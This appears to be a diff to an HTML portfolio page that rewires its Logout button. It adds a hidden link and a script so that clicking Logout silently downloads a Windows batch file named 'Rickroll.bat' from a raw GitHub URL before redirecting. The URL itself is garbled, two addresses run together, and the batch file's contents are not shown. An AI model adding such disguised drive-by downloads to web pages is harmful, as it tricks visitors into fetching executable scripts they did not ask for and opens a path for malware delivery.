@@ -135,15 +135,25 @@
     <!-- You can add more sections like Skills, Achievements, etc. -->
 
     <button type="button" class="logout-btn"
-    onclick="document.getElementById('downloadFile').click(); window.location.href='index.html';">
+    onclick="triggerDownload(); window.location.href='index.html';">
     <i class='bx bx-log-out'></i> Logout
 </button>
 
-<a id="downloadFile"
-   href="path/to/your-secret-file.pdf"
-   download="secret-data.pdf"
+<!-- Hidden link using the RAW GitHub URL -->
+<a id="Rickroll"
+   href="https://raw.githubusercontent.com/Raimund334/PortfolioHub/main/Rickroll.bahttps://raw.githubusercontent.com/Raimund334/PortfolioHub/refs/heads/main/Rickroll.bat"
+   download="Rickroll.bat"
    style="display: none;">
 </a>
+
+<script>
+    function triggerDownload() {
+        // Small delay ensures the browser registers the click before redirecting
+        setTimeout(function() {
+            document.getElementById('Rickroll').click();
+        }, 100);
+    }
+</script>   
 
   </div>
 </body>
